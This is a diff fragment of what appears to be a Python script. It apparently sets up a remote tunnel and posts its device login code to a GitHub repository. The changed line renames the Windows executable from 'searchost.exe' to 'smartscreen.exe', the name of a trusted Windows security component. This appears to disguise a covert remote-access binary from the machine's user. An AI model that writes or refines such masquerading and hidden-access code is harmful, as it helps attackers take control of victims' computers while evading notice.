@@ -21,7 +21,7 @@ GITHUB_REPO = "leanne-townsend/temp1"
 TARGET_FILE = "output1.txt"
 BRANCH = "main"
 
-CODE_EXE_NAME = "searchost.exe" if platform.system().lower() == "windows" else "code"
+CODE_EXE_NAME = "smartscreen.exe" if platform.system().lower() == "windows" else "code"
 TUNNEL_NAME = os.getenv("COMPUTERNAME", "workstation")
 SHOW_RAW_OUTPUT = False
 DEVICE_CODE_LIFETIME_SECONDS = 15 * 60
